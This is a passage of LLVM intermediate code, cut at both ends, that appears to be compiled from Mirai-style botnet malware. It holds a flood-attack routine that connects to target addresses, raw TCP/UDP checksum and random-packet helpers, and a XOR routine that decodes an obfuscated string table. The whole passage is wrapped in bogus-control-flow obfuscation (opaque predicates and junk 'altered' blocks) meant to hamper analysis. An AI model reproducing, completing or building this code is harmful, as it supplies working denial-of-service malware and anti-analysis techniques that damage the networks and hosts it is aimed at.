  %340 = trunc i32 %339 to i8
  store i8 %340, i8* %309, align 1
  %341 = bitcast %struct.sockaddr_in* %310 to i8*
  call void @llvm.memset.p0i8.i64(i8* %341, i8 0, i64 16, i32 4, i1 false)
  %342 = load i16, i16* %307, align 2
  %343 = zext i16 %342 to i32
  %344 = icmp eq i32 %343, 65535
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %73
  store i32 0, i32* %17, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %104
  %345 = call i32 @rand_next()
  %346 = trunc i32 %345 to i16
  %347 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %348 = load i32, i32* %17, align 4
  %349 = sext i32 %348 to i64
  %350 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %347, i64 %349
  %351 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %350, i32 0, i32 0
  %352 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %351, i32 0, i32 1
  store i16 %346, i16* %352, align 2
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %199
  %353 = load i32*, i32** %19, align 8
  %354 = load i32, i32* %17, align 4
  %355 = sext i32 %354 to i64
  %356 = getelementptr inbounds i32, i32* %353, i64 %355
  %357 = load i32, i32* %356, align 4
  %358 = bitcast %union.__CONST_SOCKADDR_ARG* %29 to %struct.sockaddr**
  %359 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %360 = load i32, i32* %17, align 4
  %361 = sext i32 %360 to i64
  %362 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %359, i64 %361
  %363 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %362, i32 0, i32 0
  %364 = bitcast %struct.sockaddr_in* %363 to %struct.sockaddr*
  store %struct.sockaddr* %364, %struct.sockaddr** %358, align 8
  %365 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %29, i32 0, i32 0
  %366 = load %struct.sockaddr*, %struct.sockaddr** %365, align 8
  %367 = call i32 @connect(i32 %357, %struct.sockaddr* %366, i32 16)
  %368 = icmp eq i32 %367, -1
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %239
  %369 = load i32, i32* %17, align 4
  %370 = load i8, i8* %13, align 1
  %371 = zext i8 %370 to i32
  %372 = icmp slt i32 %369, %371
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %279
  %373 = load i32, i32* %17, align 4
  %_ = shl i32 %373, 1
  %_19 = sub i32 0, %373
  %gen = add i32 %_19, 1
  %_20 = shl i32 %373, 1
  %_21 = shl i32 %373, 1
  %_22 = sub i32 %373, 1
  %gen23 = mul i32 %_22, 1
  %374 = add nsw i32 %373, 1
  store i32 %374, i32* %17, align 4
  br label %originalBB18
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_generic(i16*, i32) #0 {
  %3 = load i32, i32* @x.43
  %4 = load i32, i32* @y.44
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i16*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i64, align 8
  store i16* %0, i16** %11, align 8
  store i32 %1, i32* %12, align 4
  store i64 0, i64* %13, align 8
  store i64 0, i64* %13, align 8
  %14 = load i32, i32* @x.43
  %15 = load i32, i32* @y.44
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %22

; <label>:22:                                     ; preds = %64, %originalBBpart2
  %23 = load i32, i32* @x.43
  %24 = load i32, i32* @y.44
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %22
  %31 = load i32, i32* %12, align 4
  %32 = icmp ugt i32 %31, 1
  %33 = load i32, i32* @x.43
  %34 = load i32, i32* @y.44
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %32, label %41, label %67

; <label>:41:                                     ; preds = %originalBBpart24
  %42 = load i32, i32* @x.43
  %43 = load i32, i32* @y.44
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %41
  %50 = load i16*, i16** %11, align 8
  %51 = getelementptr inbounds i16, i16* %50, i32 1
  store i16* %51, i16** %11, align 8
  %52 = load i16, i16* %50, align 2
  %53 = zext i16 %52 to i64
  %54 = load i64, i64* %13, align 8
  %55 = add i64 %54, %53
  store i64 %55, i64* %13, align 8
  %56 = load i32, i32* @x.43
  %57 = load i32, i32* @y.44
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart213, label %originalBB6alteredBB

originalBBpart213:                                ; preds = %originalBB6
  br label %64

; <label>:64:                                     ; preds = %originalBBpart213
  %65 = load i32, i32* %12, align 4
  %66 = sub i32 %65, 2
  store i32 %66, i32* %12, align 4
  br label %22

; <label>:67:                                     ; preds = %originalBBpart24
  %68 = load i32, i32* @x.43
  %69 = load i32, i32* @y.44
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %67
  %76 = load i32, i32* %12, align 4
  %77 = icmp eq i32 %76, 1
  %78 = load i32, i32* @x.43
  %79 = load i32, i32* @y.44
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBBpart217, label %originalBB15alteredBB

originalBBpart217:                                ; preds = %originalBB15
  br i1 %77, label %86, label %109

; <label>:86:                                     ; preds = %originalBBpart217
  %87 = load i32, i32* @x.43
  %88 = load i32, i32* @y.44
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %86
  %95 = load i16*, i16** %11, align 8
  %96 = load i16, i16* %95, align 2
  %97 = trunc i16 %96 to i8
  %98 = sext i8 %97 to i64
  %99 = load i64, i64* %13, align 8
  %100 = add i64 %99, %98
  store i64 %100, i64* %13, align 8
  %101 = load i32, i32* @x.43
  %102 = load i32, i32* @y.44
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart236, label %originalBB19alteredBB

originalBBpart236:                                ; preds = %originalBB19
  br label %109

; <label>:109:                                    ; preds = %originalBBpart236, %originalBBpart217
  %110 = load i64, i64* %13, align 8
  %111 = lshr i64 %110, 16
  %112 = load i64, i64* %13, align 8
  %113 = and i64 %112, 65535
  %114 = add i64 %111, %113
  store i64 %114, i64* %13, align 8
  %115 = load i64, i64* %13, align 8
  %116 = lshr i64 %115, 16
  %117 = load i64, i64* %13, align 8
  %118 = add i64 %117, %116
  store i64 %118, i64* %13, align 8
  %119 = load i64, i64* %13, align 8
  %120 = xor i64 %119, -1
  %121 = trunc i64 %120 to i16
  ret i16 %121

originalBBalteredBB:                              ; preds = %originalBB, %2
  %122 = alloca i16*, align 8
  %123 = alloca i32, align 4
  %124 = alloca i64, align 8
  store i16* %0, i16** %122, align 8
  store i32 %1, i32* %123, align 4
  store i64 0, i64* %124, align 8
  store i64 0, i64* %124, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %22
  %125 = load i32, i32* %12, align 4
  %126 = icmp ugt i32 %125, 1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %41
  %127 = load i16*, i16** %11, align 8
  %128 = getelementptr inbounds i16, i16* %127, i32 1
  store i16* %128, i16** %11, align 8
  %129 = load i16, i16* %127, align 2
  %130 = zext i16 %129 to i64
  %131 = load i64, i64* %13, align 8
  %_ = shl i64 %131, %130
  %_7 = sub i64 %131, %130
  %gen = mul i64 %_7, %130
  %_8 = sub i64 %131, %130
  %gen9 = mul i64 %_8, %130
  %_10 = sub i64 0, %131
  %gen11 = add i64 %_10, %130
  %132 = add i64 %131, %130
  store i64 %132, i64* %13, align 8
  br label %originalBB6

originalBB15alteredBB:                            ; preds = %originalBB15, %67
  %133 = load i32, i32* %12, align 4
  %134 = icmp eq i32 %133, 1
  br label %originalBB15

originalBB19alteredBB:                            ; preds = %originalBB19, %86
  %135 = load i16*, i16** %11, align 8
  %136 = load i16, i16* %135, align 2
  %137 = trunc i16 %136 to i8
  %138 = sext i8 %137 to i64
  %139 = load i64, i64* %13, align 8
  %_20 = sub i64 0, %139
  %gen21 = add i64 %_20, %138
  %_22 = sub i64 %139, %138
  %gen23 = mul i64 %_22, %138
  %_24 = sub i64 %139, %138
  %gen25 = mul i64 %_24, %138
  %_26 = sub i64 %139, %138
  %gen27 = mul i64 %_26, %138
  %_28 = sub i64 %139, %138
  %gen29 = mul i64 %_28, %138
  %_30 = shl i64 %139, %138
  %_31 = sub i64 0, %139
  %gen32 = add i64 %_31, %138
  %_33 = shl i64 %139, %138
  %_34 = shl i64 %139, %138
  %140 = add i64 %139, %138
  store i64 %140, i64* %13, align 8
  br label %originalBB19
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  br label %23

; <label>:23:                                     ; preds = %26, %4
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %26, label %36

; <label>:26:                                     ; preds = %23
  %27 = load i16*, i16** %9, align 8
  %28 = load i16, i16* %27, align 2
  %29 = zext i16 %28 to i32
  %30 = load i32, i32* %12, align 4
  %31 = add i32 %30, %29
  store i32 %31, i32* %12, align 4
  %32 = load i16*, i16** %9, align 8
  %33 = getelementptr inbounds i16, i16* %32, i32 1
  store i16* %33, i16** %9, align 8
  %34 = load i32, i32* %8, align 4
  %35 = sub nsw i32 %34, 2
  store i32 %35, i32* %8, align 4
  br label %23

; <label>:36:                                     ; preds = %23
  %37 = load i32, i32* %8, align 4
  %38 = icmp eq i32 %37, 1
  br i1 %38, label %39, label %46

; <label>:39:                                     ; preds = %36
  %40 = load i16*, i16** %9, align 8
  %41 = bitcast i16* %40 to i8*
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = load i32, i32* %12, align 4
  %45 = add i32 %44, %43
  store i32 %45, i32* %12, align 4
  br label %46

; <label>:46:                                     ; preds = %39, %36
  %47 = load i32, i32* %10, align 4
  %48 = lshr i32 %47, 16
  %49 = and i32 %48, 65535
  %50 = load i32, i32* %12, align 4
  %51 = add i32 %50, %49
  store i32 %51, i32* %12, align 4
  %52 = load i32, i32* %10, align 4
  %53 = and i32 %52, 65535
  %54 = load i32, i32* %12, align 4
  %55 = add i32 %54, %53
  store i32 %55, i32* %12, align 4
  %56 = load i32, i32* %11, align 4
  %57 = lshr i32 %56, 16
  %58 = and i32 %57, 65535
  %59 = load i32, i32* %12, align 4
  %60 = add i32 %59, %58
  store i32 %60, i32* %12, align 4
  %61 = load i32, i32* %11, align 4
  %62 = and i32 %61, 65535
  %63 = load i32, i32* %12, align 4
  %64 = add i32 %63, %62
  store i32 %64, i32* %12, align 4
  %65 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %66 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %65, i32 0, i32 6
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i16
  %69 = call zeroext i16 @htons(i16 zeroext %68) #8
  %70 = zext i16 %69 to i32
  %71 = load i32, i32* %12, align 4
  %72 = add i32 %71, %70
  store i32 %72, i32* %12, align 4
  %73 = load i16, i16* %7, align 2
  %74 = zext i16 %73 to i32
  %75 = load i32, i32* %12, align 4
  %76 = add i32 %75, %74
  store i32 %76, i32* %12, align 4
  br label %77

; <label>:77:                                     ; preds = %97, %46
  %78 = load i32, i32* @x.45
  %79 = load i32, i32* @y.46
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %77
  %86 = load i32, i32* %12, align 4
  %87 = lshr i32 %86, 16
  %88 = icmp ne i32 %87, 0
  %89 = load i32, i32* @x.45
  %90 = load i32, i32* @y.46
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %88, label %97, label %103

; <label>:97:                                     ; preds = %originalBBpart2
  %98 = load i32, i32* %12, align 4
  %99 = and i32 %98, 65535
  %100 = load i32, i32* %12, align 4
  %101 = lshr i32 %100, 16
  %102 = add i32 %99, %101
  store i32 %102, i32* %12, align 4
  br label %77

; <label>:103:                                    ; preds = %originalBBpart2
  %104 = load i32, i32* @x.45
  %105 = load i32, i32* @y.46
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBB3, label %originalBB3alteredBB

originalBB3:                                      ; preds = %originalBB3alteredBB, %103
  %112 = load i32, i32* %12, align 4
  %113 = xor i32 %112, -1
  %114 = trunc i32 %113 to i16
  %115 = load i32, i32* @x.45
  %116 = load i32, i32* @y.46
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBBpart29, label %originalBB3alteredBB

originalBBpart29:                                 ; preds = %originalBB3
  ret i16 %114

originalBBalteredBB:                              ; preds = %originalBB, %77
  %123 = load i32, i32* %12, align 4
  %_ = sub i32 0, %123
  %gen = add i32 %_, 16
  %_1 = sub i32 %123, 16
  %gen2 = mul i32 %_1, 16
  %124 = lshr i32 %123, 16
  %125 = icmp ne i32 %124, 0
  br label %originalBB

originalBB3alteredBB:                             ; preds = %originalBB3, %103
  %126 = load i32, i32* %12, align 4
  %_4 = sub i32 0, %126
  %gen5 = add i32 %_4, -1
  %_6 = shl i32 %126, -1
  %_7 = shl i32 %126, -1
  %127 = xor i32 %126, -1
  %128 = trunc i32 %127 to i16
  br label %originalBB3
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, %4
  store i32 %6, i32* %1, align 4
  %7 = load i32, i32* %1, align 4
  %8 = lshr i32 %7, 8
  %9 = load i32, i32* %1, align 4
  %10 = xor i32 %9, %8
  store i32 %10, i32* %1, align 4
  %11 = load i32, i32* @y, align 4
  store i32 %11, i32* @x, align 4
  %12 = load i32, i32* @z, align 4
  store i32 %12, i32* @y, align 4
  %13 = load i32, i32* @w, align 4
  store i32 %13, i32* @z, align 4
  %14 = load i32, i32* @w, align 4
  %15 = lshr i32 %14, 19
  %16 = load i32, i32* @w, align 4
  %17 = xor i32 %16, %15
  store i32 %17, i32* @w, align 4
  %18 = load i32, i32* %1, align 4
  %19 = load i32, i32* @w, align 4
  %20 = xor i32 %19, %18
  store i32 %20, i32* @w, align 4
  %21 = load i32, i32* @w, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind uwtable
define void @rand_str(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  br label %5

; <label>:5:                                      ; preds = %originalBBpart227, %2
  %6 = load i32, i32* @x.49
  %7 = load i32, i32* @y.50
  %8 = sub i32 %6, 1
  %9 = mul i32 %6, %8
  %10 = urem i32 %9, 2
  %11 = icmp eq i32 %10, 0
  %12 = icmp slt i32 %7, 10
  %13 = or i1 %11, %12
  br i1 %13, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %5
  %14 = load i32, i32* %4, align 4
  %15 = icmp sgt i32 %14, 0
  %16 = load i32, i32* @x.49
  %17 = load i32, i32* @y.50
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %15, label %24, label %110

; <label>:24:                                     ; preds = %originalBBpart2
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %25, 4
  br i1 %26, label %27, label %37

; <label>:27:                                     ; preds = %24
  %28 = call i32 @rand_next()
  %29 = load i8*, i8** %3, align 8
  %30 = bitcast i8* %29 to i32*
  store i32 %28, i32* %30, align 4
  %31 = load i8*, i8** %3, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 4
  store i8* %32, i8** %3, align 8
  %33 = load i32, i32* %4, align 4
  %34 = sext i32 %33 to i64
  %35 = sub i64 %34, 4
  %36 = trunc i64 %35 to i32
  store i32 %36, i32* %4, align 4
  br label %93

; <label>:37:                                     ; preds = %24
  %38 = load i32, i32* @x.49
  %39 = load i32, i32* @y.50
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %37
  %46 = load i32, i32* %4, align 4
  %47 = icmp sge i32 %46, 2
  %48 = load i32, i32* @x.49
  %49 = load i32, i32* @y.50
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %47, label %56, label %84

; <label>:56:                                     ; preds = %originalBBpart24
  %57 = load i32, i32* @x.49
  %58 = load i32, i32* @y.50
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %56
  %65 = call i32 @rand_next()
  %66 = and i32 %65, 65535
  %67 = trunc i32 %66 to i16
  %68 = load i8*, i8** %3, align 8
  %69 = bitcast i8* %68 to i16*
  store i16 %67, i16* %69, align 2
  %70 = load i8*, i8** %3, align 8
  %71 = getelementptr inbounds i8, i8* %70, i64 2
  store i8* %71, i8** %3, align 8
  %72 = load i32, i32* %4, align 4
  %73 = sext i32 %72 to i64
  %74 = sub i64 %73, 2
  %75 = trunc i64 %74 to i32
  store i32 %75, i32* %4, align 4
  %76 = load i32, i32* @x.49
  %77 = load i32, i32* @y.50
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart222, label %originalBB6alteredBB

originalBBpart222:                                ; preds = %originalBB6
  br label %92

; <label>:84:                                     ; preds = %originalBBpart24
  %85 = call i32 @rand_next()
  %86 = and i32 %85, 255
  %87 = trunc i32 %86 to i8
  %88 = load i8*, i8** %3, align 8
  %89 = getelementptr inbounds i8, i8* %88, i32 1
  store i8* %89, i8** %3, align 8
  store i8 %87, i8* %88, align 1
  %90 = load i32, i32* %4, align 4
  %91 = add nsw i32 %90, -1
  store i32 %91, i32* %4, align 4
  br label %92

; <label>:92:                                     ; preds = %84, %originalBBpart222
  br label %93

; <label>:93:                                     ; preds = %92, %27
  %94 = load i32, i32* @x.49
  %95 = load i32, i32* @y.50
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %93
  %102 = load i32, i32* @x.49
  %103 = load i32, i32* @y.50
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBBpart227, label %originalBB24alteredBB

originalBBpart227:                                ; preds = %originalBB24
  br label %5

; <label>:110:                                    ; preds = %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %5
  %111 = load i32, i32* %4, align 4
  %112 = icmp sgt i32 %111, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %37
  %113 = load i32, i32* %4, align 4
  %114 = icmp sge i32 %113, 2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %56
  %115 = call i32 @rand_next()
  %_ = sub i32 0, %115
  %gen = add i32 %_, 65535
  %_7 = sub i32 0, %115
  %gen8 = add i32 %_7, 65535
  %_9 = sub i32 0, %115
  %gen10 = add i32 %_9, 65535
  %116 = and i32 %115, 65535
  %117 = trunc i32 %116 to i16
  %118 = load i8*, i8** %3, align 8
  %119 = bitcast i8* %118 to i16*
  store i16 %117, i16* %119, align 2
  %120 = load i8*, i8** %3, align 8
  %121 = getelementptr inbounds i8, i8* %120, i64 2
  store i8* %121, i8** %3, align 8
  %122 = load i32, i32* %4, align 4
  %123 = sext i32 %122 to i64
  %_11 = sub i64 0, %123
  %gen12 = add i64 %_11, 2
  %_13 = sub i64 %123, 2
  %gen14 = mul i64 %_13, 2
  %_15 = sub i64 %123, 2
  %gen16 = mul i64 %_15, 2
  %_17 = shl i64 %123, 2
  %_18 = sub i64 %123, 2
  %gen19 = mul i64 %_18, 2
  %_20 = shl i64 %123, 2
  %124 = sub i64 %123, 2
  %125 = trunc i64 %124 to i32
  store i32 %125, i32* %4, align 4
  br label %originalBB6

originalBB24alteredBB:                            ; preds = %originalBB24, %93
  br label %originalBB24
}

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [41 x %struct.table_value], [41 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = load i32, i32* @x.53
  %3 = load i32, i32* @y.54
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8, align 1
  %11 = alloca i32, align 4
  %12 = alloca %struct.table_value*, align 8
  %13 = alloca i8, align 1
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  store i8 %0, i8* %10, align 1
  store i32 0, i32* %11, align 4
  %17 = load i8, i8* %10, align 1
  %18 = zext i8 %17 to i64
  %19 = getelementptr inbounds [41 x %struct.table_value], [41 x %struct.table_value]* @table, i64 0, i64 %18
  store %struct.table_value* %19, %struct.table_value** %12, align 8
  %20 = load i32, i32* @table_key, align 4
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %13, align 1
  %23 = load i32, i32* @table_key, align 4
  %24 = lshr i32 %23, 8
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %14, align 1
  %27 = load i32, i32* @table_key, align 4
  %28 = lshr i32 %27, 16
  %29 = and i32 %28, 255
  %30 = trunc i32 %29 to i8
  store i8 %30, i8* %15, align 1
  %31 = load i32, i32* @table_key, align 4
  %32 = lshr i32 %31, 24
  %33 = and i32 %32, 255
  %34 = trunc i32 %33 to i8
  store i8 %34, i8* %16, align 1
  store i32 0, i32* %11, align 4
  %35 = load i32, i32* @x.53
  %36 = load i32, i32* @y.54
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %43

; <label>:43:                                     ; preds = %99, %originalBBpart2
  %44 = load i32, i32* %11, align 4
  %45 = load %struct.table_value*, %struct.table_value** %12, align 8
  %46 = getelementptr inbounds %struct.table_value, %struct.table_value* %45, i32 0, i32 1
  %47 = load i16, i16* %46, align 8
  %48 = zext i16 %47 to i32
  %49 = icmp slt i32 %44, %48
  br i1 %49, label %50, label %102

; <label>:50:                                     ; preds = %43
  %51 = load i8, i8* %13, align 1
  %52 = zext i8 %51 to i32
  %53 = load %struct.table_value*, %struct.table_value** %12, align 8
  %54 = getelementptr inbounds %struct.table_value, %struct.table_value* %53, i32 0, i32 0
  %55 = load i8*, i8** %54, align 8
  %56 = load i32, i32* %11, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %55, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = xor i32 %60, %52
  %62 = trunc i32 %61 to i8
  store i8 %62, i8* %58, align 1
  %63 = load i8, i8* %14, align 1
  %64 = zext i8 %63 to i32
  %65 = load %struct.table_value*, %struct.table_value** %12, align 8
  %66 = getelementptr inbounds %struct.table_value, %struct.table_value* %65, i32 0, i32 0
  %67 = load i8*, i8** %66, align 8
  %68 = load i32, i32* %11, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8, i8* %67, i64 %69
  %71 = load i8, i8* %70, align 1
  %72 = sext i8 %71 to i32
  %73 = xor i32 %72, %64
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %70, align 1
  %75 = load i8, i8* %15, align 1
  %76 = zext i8 %75 to i32
  %77 = load %struct.table_value*, %struct.table_value** %12, align 8
  %78 = getelementptr inbounds %struct.table_value, %struct.table_value* %77, i32 0, i32 0
  %79 = load i8*, i8** %78, align 8
  %80 = load i32, i32* %11, align 4
  %81 = sext i32 %80 to i64
